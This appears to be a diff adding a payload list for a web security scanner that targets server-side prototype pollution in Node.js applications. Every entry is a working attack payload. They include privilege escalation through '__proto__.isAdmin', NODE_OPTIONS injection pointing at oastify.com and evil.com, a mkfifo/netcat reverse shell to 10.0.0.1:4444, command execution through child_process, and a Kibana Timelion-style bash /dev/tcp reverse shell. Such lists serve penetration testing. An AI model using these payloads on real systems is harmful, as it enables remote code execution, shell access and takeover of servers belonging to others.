@@ -1,0 +1,62 @@
+payload:
+  - |
+    {
+      "__proto__": {
+        "argv0":"node",
+        "shell":"node",
+        "NODE_OPTIONS":"--inspect=id.oastify.com"
+      }
+    }
+  - |
+    {
+      "name": "john",
+      "email": "john@example.com",
+      "__proto__": {
+          "isAdmin": true
+      }
+    }
+  - |
+    {
+      "name": "john",
+      "email": "john@example.com",
+      "__proto__": {
+          "json spaces": 10
+      }
+    }
+  - |
+    "__proto__": {
+      "shell": "node",
+      "NODE_OPTIONS": "--inspect=evil.com"
+    }
+  - |
+    "__proto__": {
+    "execArgv": [
+        "--eval=require('child_process').execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f')"
+    ]}
+  - |
+    "constructor":{
+      "prototype":{
+        "env":{
+          "xyz":"require('child_process').execSync('whoami').toString()"
+        },
+        "NODE_OPTIONS":"--require /proc/self/environ"
+      }
+    }
+  - |
+    {
+      "sheet": [
+        ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"
+      ],
+      "time": {
+        "from": "now-15m",
+        "to": "now",
+        "mode": "quick",
+        "interval": "10s",
+        "timezone": "Asia/Shanghai"
+      }
+    }
+encoder:
+  - Plain
+placeholder:
+  - JSONRequest
+type: PrototypePollutionServerSide
